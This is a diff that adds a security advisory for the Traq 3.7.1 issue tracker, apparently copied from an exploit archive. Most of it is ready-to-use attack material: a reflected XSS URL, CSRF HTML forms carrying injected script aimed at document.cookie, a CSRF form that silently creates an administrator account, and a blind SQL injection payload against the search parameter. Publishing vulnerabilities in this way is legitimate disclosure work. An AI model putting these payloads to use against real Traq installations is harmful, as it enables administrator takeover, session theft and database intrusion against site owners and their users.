@@ -1,0 +1,92 @@
+id: 31392
+date: 10/23/2018
+title: Traq 3.7.1 CSRF / XSS / SQL Injection Vulnerabilities
+author: Matt Landers
+cves: 
+
+=================================================
+
+Synopsis:          Traq vulnerable to XSS, Admin account creation CSRF, SQL Injection, Lack of session timeout.
+Product:           Traq
+Version:           3.7.1
+Vendor site:       https://traq.io/
+Researcher:        Matt Landers
+       matt@mjlanders.com
+       twitter.com/matthewjland
+        https://mjlanders.org/
+                                     
+=================================================
+
+1: Username enumeration via
+http://example.com/home/example/public_html/traq/users/1 = admin
+http://example.com/home/example/public_html/traq/users/2 = anonymous
+http://example.com/home/example/public_html/traq/users/3 = user etc etc
+
+
+2: Reflected XSS
+A GET reflected XSS appears in the search parameter of the following request.
+https://example.com/traq/tickets?search="><Script>alert(document.domain)</Script>
+
+
+3: CSRF - XSS
+This was a post XSS combined with a csrf vulnerability in the email parameter in the following request.
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://example.com/home/public_html/traq/usercp" method="POST">
+      <input type="hidden" name="name" value="Administrator" />
+      <input type="hidden" name="email" value="�tt1kr"><img src=a onerror=alert(document.cookie)>awezh" />
+      <input type="hidden" name="watch_created_tickets" value="1" />
+      <input type="hidden" name="locale" value="enus" />
+      <input type="hidden" name="submit" value="Save" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+4: CSRF - XSS
+This was a post XSS combined with a csrf vulnerability in the name and email parameter in the following request.
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://example.com/home/public_html/traq/admin/users/new?overlay=true" method="POST">
+      <input type="hidden" name="username" value="user1" />
+      <input type="hidden" name="name" value="guyj"><img src=a onerror=alert(document.domain)>mztcr" />
+      <input type="hidden" name="password" value="userpass" />
+      <input type="hidden" name="email" value="test@testy2.comlgfyr"><img src=a onerror=alert(document.cookie)>jj194" />
+      <input type="hidden" name="group_id" value="2" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+5: Admin user creation via CSRF in the same request as the above mentioned item 4.  The xss could be used to notify the attacker when the admin triggers the csrf, the admin account is created by setting the group id to 1 in this request.
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://example.com/home/public_html/traq/admin/users/new?overlay=true" method="POST">
+      <input type="hidden" name="username" value="testadmin" />
+      <input type="hidden" name="name" value="guy smiley" />
+      <input type="hidden" name="password" value="testadmin" />
+      <input type="hidden" name="email" value="testadmin@evil.com" />
+      <input type="hidden" name="group_id" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+6: SQL Injection via the search parameter, I was able to have sqlmap return with the database current user and database type.  The following is the sql injection I used in order to achieve this.
+
+Parameter: search (URI)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: http://example.com:80/home/example/public_html/traq/dfgdfg/tickets?search=') RLIKE (SELECT (CASE WHEN (6383=6383) THEN '' ELSE 0x28 END)) AND ('yDch'='yDch&order_by=component.asc
+
+
+7: There appears to be no session timeout, admin account stayed logged in for two days.
+
+#  0day.today [2023-03-22]  #
